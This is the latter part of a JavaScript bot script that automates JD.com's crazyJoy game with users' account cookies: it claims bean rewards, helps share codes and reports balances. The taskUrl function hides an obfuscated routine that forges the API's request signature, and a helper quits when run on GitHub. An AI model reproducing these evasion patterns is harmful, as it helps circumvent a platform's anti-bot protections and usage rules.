          if (safeGet(data)) {
            data = JSON.parse(data);
            if (data['resultCode'] ==='0') {
              console.log(`助力结果:${JSON.stringify(data)}`);
            } else if (data['resultCode'] === '2000402') {
              console.log(data.resultTips)
            } else {
              console.log(`助力异常:${JSON.stringify(data)}`);
            }
          }
        }
      } catch (e) {
        $.logErr(e, resp)
      } finally {
        resolve();
      }
    })
  })
}

function getUserBean() {
  return new Promise(async resolve => {
    $.get(taskUrl('crazyJoy_user_getJdBeanInfo'), async (err, resp, data) => {
      try {
        if (err) {
          console.log(`${JSON.stringify(err)}`)
          console.log(`${$.name} API请求失败，请检查网路重试`)
        } else {
          if (safeGet(data)) {
            data = JSON.parse(data);
            if (data.success && data.data && data.data.totalBeans)
              $.bean = data.data.totalBeans
            else
              console.log(`获取信息失败`)
          }
        }
      } catch (e) {
        $.logErr(e, resp)
      } finally {
        resolve();
      }
    })
  })
}

function getCoin() {
  return new Promise(async resolve => {
    $.get(taskUrl('crazyJoy_joy_produce'), async (err, resp, data) => {
      try {
        if (err) {
          console.log(`${JSON.stringify(err)}`)
          console.log(`${$.name} API请求失败，请检查网路重试`)
        } else {
          if (safeGet(data)) {
            data = JSON.parse(data);
            if (data.data && data.data.totalCoinAmount) {
              $.coin = data.data.totalCoinAmount;
            }
          }
        }
      } catch (e) {
        $.logErr(e, resp)
      } finally {
        resolve();
      }
    })
  })
}
//领取解锁等级奖励（京豆）
function getGrowthReward() {
  return new Promise(async resolve => {
    const body = { "paramData":{"eventType":"GROWTH_REWARD"} };
    $.get(taskUrl('crazyJoy_event_getGrowthAndSceneState', JSON.stringify(body)), async (err, resp, data) => {
      try {
        if (err) {
          console.log(`${JSON.stringify(err)}`)
          console.log(`${$.name} API请求失败，请检查网路重试`)
        } else {
          if (safeGet(data)) {
            data = JSON.parse(data);
            if (data['resultCode'] === '0') {
              if (data.data) {
                for (let item of data.data) {
                  if (item.status === 1) {
                    if (item.eventRecordId) await obtainAward(item.eventRecordId);
                  }
                }
                if ($.GROWTH_REWARD_BEAN > 0) {
                  message += `解锁等级奖励：获得${$.GROWTH_REWARD_BEAN}京豆\n`;
                }
              }
            }
          }
        }
      } catch (e) {
        $.logErr(e, resp)
      } finally {
        resolve();
      }
    })
  })
}
//获取特殊JOY情况
function getSpecialJoy() {
  return new Promise(async resolve => {
    const body = { "paramData":{"typeId": 4} };
    $.get(taskUrl('crazyJoy_user_getSpecialJoy', JSON.stringify(body)), async (err, resp, data) => {
      try {
        if (err) {
          console.log(`${JSON.stringify(err)}`)
          console.log(`${$.name} API请求失败，请检查网路重试`)
        } else {
          if (safeGet(data)) {
            data = JSON.parse(data);
            if (data['resultCode'] === '0') {
              if (data.data) {
                message += '五福汪:'
                if (data['data'] && data['data'].length > 0) {
                  for (let item of data['data']) {
                    if (item['joyId'] === 1003) {
                      message += `多多JOY(${item['count']}只) `
                    } else if (item['joyId'] === 1004) {
                      message += `快乐JOY(${item['count']}只) `
                    } else if (item['joyId'] === 1005) {
                      message += `好物JOY(${item['count']}只) `
                    } else if (item['joyId'] === 1006) {
                      message += `省钱JOY(${item['count']}只) `
                    } else if (item['joyId'] === 1007) {
                      message += `东东JOY(${item['count']}只)`
                    } else {
                      message += `暂无`
                    }
                  }
                } else {
                  message += `暂无`;
                }
                if (data['data'].length >= 5) {
                  $.msg($.name, '', `京东账号 ${$.index}${$.nickName}\n恭喜你,已集成五福汪可合成分红JOY了`)
                  if ($.isNode()) await notify.sendNotify(`${$.name} - ${$.index} - ${$.nickName}`, `京东账号 ${$.index}${$.nickName}\n恭喜你,已集成五福汪可合成分红JOY了`);
                }
              }
            }
          }
        }
      } catch (e) {
        $.logErr(e, resp)
      } finally {
        resolve();
      }
    })
  })
}
function obtainAward(eventRecordId) {
  return new Promise(async resolve => {
    const body = {"eventType": "GROWTH_REWARD", eventRecordId};
    $.get(taskUrl('crazyJoy_event_obtainAward', JSON.stringify(body)), async (err, resp, data) => {
      try {
        if (err) {
          console.log(`${JSON.stringify(err)}`)
          console.log(`${$.name} API请求失败，请检查网路重试`)
        } else {
          if (safeGet(data)) {
            data = JSON.parse(data);
            if (data['resultCode'] === '0') {
              $.GROWTH_REWARD_BEAN += data.data['beans'];
            }
          }
        }
      } catch (e) {
        $.logErr(e, resp)
      } finally {
        resolve();
      }
    })
  })
}
function showMsg() {
  return new Promise(async resolve => {
    message += `\n当前信息：${$.bean}京豆，${$.coin}金币`
    $.msg($.name, '', `京东账号${$.index} ${$.nickName}\n${message}`)
    resolve()
  })
}
function taskUrl(functionId, body = '') {
  var __encode ='jsjiami.com',_a={}, _0xb483=["\x5F\x64\x65\x63\x6F\x64\x65","\x68\x74\x74\x70\x3A\x2F\x2F\x77\x77\x77\x2E\x73\x6F\x6A\x73\x6F\x6E\x2E\x63\x6F\x6D\x2F\x6A\x61\x76\x61\x73\x63\x72\x69\x70\x74\x6F\x62\x66\x75\x73\x63\x61\x74\x6F\x72\x2E\x68\x74\x6D\x6C"];(function(_0xd642x1){_0xd642x1[_0xb483[0]]= _0xb483[1]})(_a);var __Oxb2398=["\x73\x75\x62\x73\x74\x72","\x6E\x6F\x77","","\x61\x44\x76\x53\x63\x42\x76\x24\x67\x47\x51\x76\x72\x58\x66\x76\x61\x38\x64\x47\x21\x5A\x43\x40\x44\x41\x37\x30\x59\x25\x6C\x58","\x6D\x64\x35","\x75\x6E\x64\x65\x66\x69\x6E\x65\x64","\x6C\x6F\x67","\u5220\u9664","\u7248\u672C\u53F7\uFF0C\x6A\x73\u4F1A\u5B9A","\u671F\u5F39\u7A97\uFF0C","\u8FD8\u8BF7\u652F\u6301\u6211\u4EEC\u7684\u5DE5\u4F5C","\x6A\x73\x6A\x69\x61","\x6D\x69\x2E\x63\x6F\x6D"];let t=Date[__Oxb2398[0x1]]().toString()[__Oxb2398[0x0]](0,10);let e=body|| __Oxb2398[0x2];e= $[__Oxb2398[0x4]](__Oxb2398[0x3]+ e+ t);e= e+ Number(t).toString(16);(function(_0x8b7fx3,_0x8b7fx4,_0x8b7fx5,_0x8b7fx6,_0x8b7fx7,_0x8b7fx8){_0x8b7fx8= __Oxb2398[0x5];_0x8b7fx6= function(_0x8b7fx9){if( typeof alert!== _0x8b7fx8){alert(_0x8b7fx9)};if( typeof console!== _0x8b7fx8){console[__Oxb2398[0x6]](_0x8b7fx9)}};_0x8b7fx5= function(_0x8b7fxa,_0x8b7fx3){return _0x8b7fxa+ _0x8b7fx3};_0x8b7fx7= _0x8b7fx5(__Oxb2398[0x7],_0x8b7fx5(_0x8b7fx5(__Oxb2398[0x8],__Oxb2398[0x9]),__Oxb2398[0xa]));try{_0x8b7fx3= __encode;if(!( typeof _0x8b7fx3!== _0x8b7fx8&& _0x8b7fx3=== _0x8b7fx5(__Oxb2398[0xb],__Oxb2398[0xc]))){_0x8b7fx6(_0x8b7fx7)}}catch(e){_0x8b7fx6(_0x8b7fx7)}})({})
  return {
    url: `${JD_API_HOST}?uts=${e}&appid=crazy_joy&functionId=${functionId}&body=${escape(body)}&t=${t}`,
    headers: {
      'Cookie': cookie,
      'Host': 'api.m.jd.com',
      'Accept': '*/*',
      'Connection': 'keep-alive',
      "User-Agent": $.isNode() ? (process.env.JD_USER_AGENT ? process.env.JD_USER_AGENT : (require('./USER_AGENTS').USER_AGENT)) : ($.getdata('JDUA') ? $.getdata('JDUA') : "jdapp;iPhone;9.4.4;14.3;network/4g;Mozilla/5.0 (iPhone; CPU iPhone OS 14_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148;supportJDSHWK/1"),
      'Accept-Language': 'zh-cn',
      'Referer': 'https://crazy-joy.jd.com/',
      'origin': 'https://crazy-joy.jd.com',
      'Accept-Encoding': 'gzip, deflate, br',
    }
  }
}
function readShareCode() {
  console.log(`开始`)
  return new Promise(async resolve => {
    $.get({url: `https://code.chiang.fun/api/v1/jd/jdcrazyjoy/read/${randomCount}/`, 'timeout': 10000}, (err, resp, data) => {
      try {
        if (err) {
          console.log(`${JSON.stringify(err)}`)
          console.log(`${$.name} API请求失败，请检查网路重试`)
        } else {
          if (data) {
            console.log(`随机取${randomCount}个码放到您固定的互助码后面(不影响已有固定互助)`)
            data = JSON.parse(data);
          }
        }
      } catch (e) {
        $.logErr(e, resp)
      } finally {
        resolve(data);
      }
    })
    await $.wait(10000);
    resolve()
  })
}
//格式化助力码
function shareCodesFormat() {
  return new Promise(async resolve => {
    // console.log(`第${$.index}个京东账号的助力码:::${$.shareCodesArr[$.index - 1]}`)
    $.newShareCodes = [];
    if ($.shareCodesArr[$.index - 1]) {
      $.newShareCodes = $.shareCodesArr[$.index - 1].split('@');
    } else {
      console.log(`由于您第${$.index}个京东账号未提供shareCode,将采纳本脚本自带的助力码\n`)
      const tempIndex = $.index > inviteCodes.length ? (inviteCodes.length - 1) : ($.index - 1);
      $.newShareCodes = inviteCodes[tempIndex].split('@');
    }
    const readShareCodeRes = await readShareCode();
    if (readShareCodeRes && readShareCodeRes.code === 200) {
      $.newShareCodes = [...new Set([...$.newShareCodes, ...(readShareCodeRes.data || [])])];
    }
    console.log(`第${$.index}个京东账号将要助力的好友${JSON.stringify($.newShareCodes)}`)
    resolve();
  })
}

function requireConfig() {
  return new Promise(resolve => {
    console.log(`开始获取${$.name}配置文件\n`);

    let shareCodes = [];
    if ($.isNode()) {
      if (process.env.JDJOY_SHARECODES) {
        if (process.env.JDJOY_SHARECODES.indexOf('\n') > -1) {
          shareCodes = process.env.JDJOY_SHARECODES.split('\n');
        } else {
          shareCodes = process.env.JDJOY_SHARECODES.split('&');
        }
      }
      if (process.env.JDJOY_HELPSELF) {
        helpSelf = process.env.JDJOY_HELPSELF
      }
      if (process.env.JDJOY_APPLYJDBEAN) {
        applyJdBean = process.env.JDJOY_APPLYJDBEAN
      }
    }
    console.log(`共${cookiesArr.length}个京东账号\n`);
    $.shareCodesArr = [];
    if ($.isNode()) {
      Object.keys(shareCodes).forEach((item) => {
        if (shareCodes[item]) {
          $.shareCodesArr.push(shareCodes[item])
        }
      })
    }
    console.log(`您提供了${$.shareCodesArr.length}个账号的${$.name}助力码\n`);
    resolve()
  })
}

function safeGet(data) {
  try {
    if (typeof JSON.parse(data) == "object") {
      return true;
    }
  } catch (e) {
    console.log(e);
    console.log(`京东服务器访问数据为空，请检查自身设备网络情况`);
    return false;
  }
}

function TotalBean() {
  return new Promise(async resolve => {
    const options = {
      "url": `https://wq.jd.com/user/info/QueryJDUserInfo?sceneval=2`,
      "headers": {
        "Accept": "application/json,text/plain, */*",
        "Content-Type": "application/x-www-form-urlencoded",
        "Accept-Encoding": "gzip, deflate, br",
        "Accept-Language": "zh-cn",
        "Connection": "keep-alive",
        "Cookie": cookie,
        "Referer": "https://wqs.jd.com/my/jingdou/my.shtml?sceneval=2",
        "User-Agent": $.isNode() ? (process.env.JD_USER_AGENT ? process.env.JD_USER_AGENT : (require('./USER_AGENTS').USER_AGENT)) : ($.getdata('JDUA') ? $.getdata('JDUA') : "jdapp;iPhone;9.4.4;14.3;network/4g;Mozilla/5.0 (iPhone; CPU iPhone OS 14_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148;supportJDSHWK/1")
      }
    }
    $.post(options, (err, resp, data) => {
      try {
        if (err) {
          console.log(`${JSON.stringify(err)}`)
          console.log(`${$.name} API请求失败，请检查网路重试`)
        } else {
          if (data) {
            data = JSON.parse(data);
            if (data['retcode'] === 13) {
              $.isLogin = false; //cookie过期
              return
            }
            if (data['retcode'] === 0) {
              $.nickName = (data['base'] && data['base'].nickname) || $.UserName;
            } else {
              $.nickName = $.UserName
            }
          } else {
            console.log(`京东服务器返回空数据`)
          }
        }
      } catch (e) {
        $.logErr(e, resp)
      } finally {
        resolve();
      }
    })
  })
}

function jsonParse(str) {
  if (typeof str == "string") {
    try {
      return JSON.parse(str);
    } catch (e) {
      console.log(e);
      $.msg($.name, '', '不要在BoxJS手动复制粘贴修改cookie')
      return [];
    }
  }
}
/**
 * 生成随机数字
 * @param {number} min 最小值（包含）
 * @param {number} max 最大值（不包含）
 */
function randomNumber(min = 0, max = 100) {
  return Math.min(Math.floor(min + Math.random() * (max - min)), max);
}
// prettier-ignore
function Env(t,e){"undefined"!=typeof process&&JSON.stringify(process.env).indexOf("GITHUB")>-1&&process.exit(0);class s{constructor(t){this.env=t}send(t,e="GET"){t="string"==typeof t?{url:t}:t;let s=this.get;return"POST"===e&&(s=this.post),new Promise((e,i)=>{s.call(this,t,(t,s,r)=>{t?i(t):e(s)})})}get(t){return this.send.call(this.env,t)}post(t){return this.send.call(this.env,t,"POST")}}return new class{constructor(t,e){this.name=t,this.http=new s(this),this.data=null,this.dataFile="box.dat",this.logs=[],this.isMute=!1,this.isNeedRewrite=!1,this.logSeparator="\n",this.startTime=(new Date).getTime(),Object.assign(this,e),this.log("",`🔔${this.name}, 开始!`)}isNode(){return"undefined"!=typeof module&&!!module.exports}isQuanX(){return"undefined"!=typeof $task}isSurge(){return"undefined"!=typeof $httpClient&&"undefined"==typeof $loon}isLoon(){return"undefined"!=typeof $loon}toObj(t,e=null){try{return JSON.parse(t)}catch{return e}}toStr(t,e=null){try{return JSON.stringify(t)}catch{return e}}getjson(t,e){let s=e;const i=this.getdata(t);if(i)try{s=JSON.parse(this.getdata(t))}catch{}return s}setjson(t,e){try{return this.setdata(JSON.stringify(t),e)}catch{return!1}}getScript(t){return new Promise(e=>{this.get({url:t},(t,s,i)=>e(i))})}runScript(t,e){return new Promise(s=>{let i=this.getdata("@chavy_boxjs_userCfgs.httpapi");i=i?i.replace(/\n/g,"").trim():i;let r=this.getdata("@chavy_boxjs_userCfgs.httpapi_timeout");r=r?1*r:20,r=e&&e.timeout?e.timeout:r;const[o,h]=i.split("@"),n={url:`http://${h}/v1/scripting/evaluate`,body:{script_text:t,mock_type:"cron",timeout:r},headers:{"X-Key":o,Accept:"*/*"}};this.post(n,(t,e,i)=>s(i))}).catch(t=>this.logErr(t))}loaddata(){if(!this.isNode())return{};{this.fs=this.fs?this.fs:require("fs"),this.path=this.path?this.path:require("path");const t=this.path.resolve(this.dataFile),e=this.path.resolve(process.cwd(),this.dataFile),s=this.fs.existsSync(t),i=!s&&this.fs.existsSync(e);if(!s&&!i)return{};{const i=s?t:e;try{return JSON.parse(this.fs.readFileSync(i))}catch(t){return{}}}}}writedata(){if(this.isNode()){this.fs=this.fs?this.fs:require("fs"),this.path=this.path?this.path:require("path");const t=this.path.resolve(this.dataFile),e=this.path.resolve(process.cwd(),this.dataFile),s=this.fs.existsSync(t),i=!s&&this.fs.existsSync(e),r=JSON.stringify(this.data);s?this.fs.writeFileSync(t,r):i?this.fs.writeFileSync(e,r):this.fs.writeFileSync(t,r)}}lodash_get(t,e,s){const i=e.replace(/\[(\d+)\]/g,".$1").split(".");let r=t;for(const t of i)if(r=Object(r)[t],void 0===r)return s;return r}lodash_set(t,e,s){return Object(t)!==t?t:(Array.isArray(e)||(e=e.toString().match(/[^.[\]]+/g)||[]),e.slice(0,-1).reduce((t,s,i)=>Object(t[s])===t[s]?t[s]:t[s]=Math.abs(e[i+1])>>0==+e[i+1]?[]:{},t)[e[e.length-1]]=s,t)}getdata(t){let e=this.getval(t);if(/^@/.test(t)){const[,s,i]=/^@(.*?)\.(.*?)$/.exec(t),r=s?this.getval(s):"";if(r)try{const t=JSON.parse(r);e=t?this.lodash_get(t,i,""):e}catch(t){e=""}}return e}setdata(t,e){let s=!1;if(/^@/.test(e)){const[,i,r]=/^@(.*?)\.(.*?)$/.exec(e),o=this.getval(i),h=i?"null"===o?null:o||"{}":"{}";try{const e=JSON.parse(h);this.lodash_set(e,r,t),s=this.setval(JSON.stringify(e),i)}catch(e){const o={};this.lodash_set(o,r,t),s=this.setval(JSON.stringify(o),i)}}else s=this.setval(t,e);return s}getval(t){return this.isSurge()||this.isLoon()?$persistentStore.read(t):this.isQuanX()?$prefs.valueForKey(t):this.isNode()?(this.data=this.loaddata(),this.data[t]):this.data&&this.data[t]||null}setval(t,e){return this.isSurge()||this.isLoon()?$persistentStore.write(t,e):this.isQuanX()?$prefs.setValueForKey(t,e):this.isNode()?(this.data=this.loaddata(),this.data[e]=t,this.writedata(),!0):this.data&&this.data[e]||null}initGotEnv(t){this.got=this.got?this.got:require("got"),this.cktough=this.cktough?this.cktough:require("tough-cookie"),this.ckjar=this.ckjar?this.ckjar:new this.cktough.CookieJar,t&&(t.headers=t.headers?t.headers:{},void 0===t.headers.Cookie&&void 0===t.cookieJar&&(t.cookieJar=this.ckjar))}get(t,e=(()=>{})){t.headers&&(delete t.headers["Content-Type"],delete t.headers["Content-Length"]),this.isSurge()||this.isLoon()?(this.isSurge()&&this.isNeedRewrite&&(t.headers=t.headers||{},Object.assign(t.headers,{"X-Surge-Skip-Scripting":!1})),$httpClient.get(t,(t,s,i)=>{!t&&s&&(s.body=i,s.statusCode=s.status),e(t,s,i)})):this.isQuanX()?(this.isNeedRewrite&&(t.opts=t.opts||{},Object.assign(t.opts,{hints:!1})),$task.fetch(t).then(t=>{const{statusCode:s,statusCode:i,headers:r,body:o}=t;e(null,{status:s,statusCode:i,headers:r,body:o},o)},t=>e(t))):this.isNode()&&(this.initGotEnv(t),this.got(t).on("redirect",(t,e)=>{try{if(t.headers["set-cookie"]){const s=t.headers["set-cookie"].map(this.cktough.Cookie.parse).toString();s&&this.ckjar.setCookieSync(s,null),e.cookieJar=this.ckjar}}catch(t){this.logErr(t)}}).then(t=>{const{statusCode:s,statusCode:i,headers:r,body:o}=t;e(null,{status:s,statusCode:i,headers:r,body:o},o)},t=>{const{message:s,response:i}=t;e(s,i,i&&i.body)}))}post(t,e=(()=>{})){if(t.body&&t.headers&&!t.headers["Content-Type"]&&(t.headers["Content-Type"]="application/x-www-form-urlencoded"),t.headers&&delete t.headers["Content-Length"],this.isSurge()||this.isLoon())this.isSurge()&&this.isNeedRewrite&&(t.headers=t.headers||{},Object.assign(t.headers,{"X-Surge-Skip-Scripting":!1})),$httpClient.post(t,(t,s,i)=>{!t&&s&&(s.body=i,s.statusCode=s.status),e(t,s,i)});else if(this.isQuanX())t.method="POST",this.isNeedRewrite&&(t.opts=t.opts||{},Object.assign(t.opts,{hints:!1})),$task.fetch(t).then(t=>{const{statusCode:s,statusCode:i,headers:r,body:o}=t;e(null,{status:s,statusCode:i,headers:r,body:o},o)},t=>e(t));else if(this.isNode()){this.initGotEnv(t);const{url:s,...i}=t;this.got.post(s,i).then(t=>{const{statusCode:s,statusCode:i,headers:r,body:o}=t;e(null,{status:s,statusCode:i,headers:r,body:o},o)},t=>{const{message:s,response:i}=t;e(s,i,i&&i.body)})}}time(t,e=null){const s=e?new Date(e):new Date;let i={"M+":s.getMonth()+1,"d+":s.getDate(),"H+":s.getHours(),"m+":s.getMinutes(),"s+":s.getSeconds(),"q+":Math.floor((s.getMonth()+3)/3),S:s.getMilliseconds()};/(y+)/.test(t)&&(t=t.replace(RegExp.$1,(s.getFullYear()+"").substr(4-RegExp.$1.length)));for(let e in i)new RegExp("("+e+")").test(t)&&(t=t.replace(RegExp.$1,1==RegExp.$1.length?i[e]:("00"+i[e]).substr((""+i[e]).length)));return t}msg(e=t,s="",i="",r){const o=t=>{if(!t)return t;if("string"==typeof t)return this.isLoon()?t:this.isQuanX()?{"open-url":t}:this.isSurge()?{url:t}:void 0;if("object"==typeof t){if(this.isLoon()){let e=t.openUrl||t.url||t["open-url"],s=t.mediaUrl||t["media-url"];return{openUrl:e,mediaUrl:s}}if(this.isQuanX()){let e=t["open-url"]||t.url||t.openUrl,s=t["media-url"]||t.mediaUrl;return{"open-url":e,"media-url":s}}if(this.isSurge()){let e=t.url||t.openUrl||t["open-url"];return{url:e}}}};if(this.isMute||(this.isSurge()||this.isLoon()?$notification.post(e,s,i,o(r)):this.isQuanX()&&$notify(e,s,i,o(r))),!this.isMuteLog){let t=["","==============📣系统通知📣=============="];t.push(e),s&&t.push(s),i&&t.push(i),console.log(t.join("\n")),this.logs=this.logs.concat(t)}}log(...t){t.length>0&&(this.logs=[...this.logs,...t]),console.log(t.join(this.logSeparator))}logErr(t,e){const s=!this.isSurge()&&!this.isQuanX()&&!this.isLoon();s?this.log("",`❗️${this.name}, 错误!`,t.stack):this.log("",`❗️${this.name}, 错误!`,t)}wait(t){return new Promise(e=>setTimeout(e,t))}done(t={}){const e=(new Date).getTime(),s=(e-this.startTime)/1e3;this.log("",`🔔${this.name}, 结束! 🕛 ${s} 秒`),this.log(),(this.isSurge()||this.isQuanX()||this.isLoon())&&$done(t)}}(t,e)}
